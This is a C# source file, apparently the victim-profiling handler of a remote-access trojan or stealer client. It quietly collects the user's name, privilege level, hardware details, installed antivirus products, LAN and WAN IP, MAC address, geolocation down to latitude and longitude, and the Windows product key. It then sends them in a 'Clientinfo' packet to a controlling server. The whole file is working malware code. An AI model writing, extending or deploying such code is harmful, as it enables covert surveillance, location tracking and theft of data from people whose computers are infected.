using Client.Connection;
using Client.Things;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Security.Principal;
using Microsoft.VisualBasic.Devices;

namespace Client.Handlers
{
    internal class HandleInfo
    {
        public HandleInfo()
        {
            GeoInfo.Get();
            Stuff.Pack meow = new Stuff.Pack();
            meow.Set("Packet", "Clientinfo");
            meow.Set("UID", UID.Get());

            meow.Set("Username", Environment.UserName);
            meow.Set("Domain Name", Environment.UserDomainName);
            meow.Set("Executing as", IsAdmin().ToString().ToLower().Replace("true", "Administrator").Replace("false", "User"));
            meow.Set("User clock", DateTime.Now);
            meow.Set("Operative system", (new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
            Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit")).Trim());
            meow.Set("Bios Manufacturer", GetBiosManufacturer());
            meow.Set("Mainboard Name", GetMainboardName());
            meow.Set("Physical memory", GetTotalPhysicalMemoryInMb() + "MB");
            meow.Set("CPU", GetCpuName());
            meow.Set("GPU", GetGpuName());
            meow.Set("Antivirus", GetAntivirus());
            meow.Set("Lan IP", GetLanIpAddress());
            meow.Set("Wan IP", GeoInfo.WanIpAddress);
            meow.Set("Mac Address", GetMacAddress());
            meow.Set("Country", GeoInfo.Country);
            meow.Set("State", GeoInfo.State);
            meow.Set("City", GeoInfo.City);
            meow.Set("Latitude", GeoInfo.Lat);
            meow.Set("Longitude", GeoInfo.Lon);
            meow.Set("Proxy", GeoInfo.Proxy);
            meow.Set("Hosting", GeoInfo.Hosting);
            meow.Set("User ID", UID.Get());
            meow.Set("License Key", GetWindowsLicenseKey());
            SillyClient.Send(meow.Pacc());
        }

        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static string GetWindowsLicenseKey()
        {
            try
            {
                string licenseKey = string.Empty;

                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM SoftwareLicensingService");

                foreach (ManagementObject obj in searcher.Get())
                {
                    licenseKey = obj["OA3xOriginalProductKey"]?.ToString();
                    break;
                }

                return licenseKey ?? "License key not found";
            }
            catch
            {
                return "Error retrieving license key";
            }
        }

        public static string GetAntivirus()
        {
            try
            {
                using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
                {
                    List<string> av = new List<string>();
                    foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
                    {
                        av.Add(searchResult["displayName"].ToString());
                    }
                    if (av.Count == 0) return "N/A";
                    return string.Join(", ", av.ToArray());
                }
            }
            catch
            {
                return "N/A";
            }
        }

        public static string GetBiosManufacturer()
        {
            try
            {
                string biosIdentifier = string.Empty;
                string query = "SELECT * FROM Win32_BIOS";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        biosIdentifier = mObject["Manufacturer"].ToString();
                        break;
                    }
                }

                return (!string.IsNullOrEmpty(biosIdentifier)) ? biosIdentifier : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        public static string GetMainboardName()
        {
            try
            {
                string mainboardIdentifier = string.Empty;
                string query = "SELECT * FROM Win32_BaseBoard";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        mainboardIdentifier = mObject["Manufacturer"].ToString() + " " + mObject["Product"].ToString();
                        break;
                    }
                }

                return (!string.IsNullOrEmpty(mainboardIdentifier)) ? mainboardIdentifier : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        public static string GetCpuName()
        {
            try
            {
                string cpuName = string.Empty;
                string query = "SELECT * FROM Win32_Processor";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        cpuName += mObject["Name"].ToString() + "; ";
                    }
                }
                return (!string.IsNullOrEmpty(cpuName)) ? cpuName : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        public static string GetGpuName()
        {
            try
            {
                string gpuName = string.Empty;
                string query = "SELECT * FROM Win32_DisplayConfiguration";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        gpuName += mObject["Description"].ToString() + "; ";
                    }
                }

                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        private static int GetTotalPhysicalMemoryInMb()
        {
            try
            {
                int installedRAM = 0;
                string query = "Select * From Win32_ComputerSystem";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        double bytes = (Convert.ToDouble(mObject["TotalPhysicalMemory"]));
                        installedRAM = (int)(bytes / 1048576);
                        break;
                    }
                }

                return installedRAM;
            }
            catch
            {
                return -1;
            }
        }

        private static string GetLanIpAddress()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                GatewayIPAddressInformation gatewayAddress = ni.GetIPProperties().GatewayAddresses.FirstOrDefault();
                if (gatewayAddress != null)
                {
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                        ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                        ni.OperationalStatus == OperationalStatus.Up)
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                                ip.AddressPreferredLifetime == UInt32.MaxValue)
                                continue;

                            return ip.Address.ToString();
                        }
                    }
                }
            }

            return "-";
        }

        private static string GetMacAddress()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    ni.OperationalStatus == OperationalStatus.Up)
                {
                    bool foundCorrect = false;
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                            ip.AddressPreferredLifetime == UInt32.MaxValue)
                            continue;

                        foundCorrect = (ip.Address.ToString() == GetLanIpAddress());
                    }
                    return ni.GetPhysicalAddress().ToString();
                }
            }

            return "-";
        }

    }
    class GeoInfo
    {
        public static string WanIpAddress { get; set; }
        public static string Country { get; set; }
        public static string State { get; set; }
        public static string City { get; set; }
        public static string Lat { get; set; }
        public static string Lon { get; set; }
        public static string Isp { get; set; }
        public static string Proxy { get; set; }
        public static string Hosting { get; set; }
        public static void Get()
        {
            try
            {
                string geoInfo = new WebClient().DownloadString("http://ip-api.com/line");
                string[] infos = geoInfo.Split('\n');
                Country = infos[1];
                State = infos[4];
                City = infos[5];
                Lat = infos[6];
                Lon = infos[7];
                Isp = infos[9];
                Proxy = new WebClient().DownloadString("http://ip-api.com/line?fields=proxy");
                Hosting = new WebClient().DownloadString("http://ip-api.com/line?fields=hosting");
                WanIpAddress = infos[13];
            }
            catch
            {
            }
        }
    }
}